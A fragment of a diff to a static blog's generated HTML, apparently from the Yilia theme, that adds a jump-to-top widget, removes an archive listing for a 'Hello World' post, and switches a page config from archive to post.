+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/10/12/hello-world/" class="archive-article-date">
-  	<time datetime="2018-10-12T11:54:45.877Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/10/12/hello-world/">Hello World</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -287,8 +373,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
